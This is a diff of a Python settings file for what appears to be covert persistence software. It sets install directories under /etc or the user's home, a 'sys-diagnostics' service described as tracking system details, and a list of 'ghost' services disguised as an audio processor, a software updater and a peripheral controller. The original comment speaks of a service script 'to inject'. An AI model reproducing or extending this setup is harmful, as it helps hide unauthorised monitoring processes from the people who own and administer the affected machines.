@@ -1,12 +1,21 @@
 #settings if run as root
-root = {"targetDir": "/etc/sysDiag/", "serviceLoc": "/etc/systemd/system/"}
+root = {"ghostDir": "/etc/", "targetDir": "/etc/", "serviceDir": "/etc/systemd/system/"}
 
 #settings if run without root
-user = {"targetDir": "~/.sysDiag/", "serviceLoc": "~/.config/systemd/user/"}
+user = {"ghostDir": "~/.config/", "targetDir": "~/", "serviceDir": "~/.config/systemd/user/"}
+
+#folderName
+dirName= "sysDiag"
 
 #name of serveral files
 tarName = "systemDiagnostics.tar"
-serviceName = "sys-diagnostics.service"
+serviceName = "sys-diagnostics"
 
-#service script to inject
-service = "[Unit]\nDescription=\"tracks system details\"\n[Service]\nType=simple\nExecStart=/usr/bin/python3 {targetPath}"
+#description of main service
+serviceDesc = "tracks system details"
+
+#data for ghost processes
+#list of tuples: (fileName, serviceName, serviceDescription)
+ghosts = [("audioProc", "audioProcessor", "provides audio control"),
+	("updater", "softwareUpdater", "keeps software up to date"),
+	("ioControl", "ioControl", "controls generic peripheral devices")]
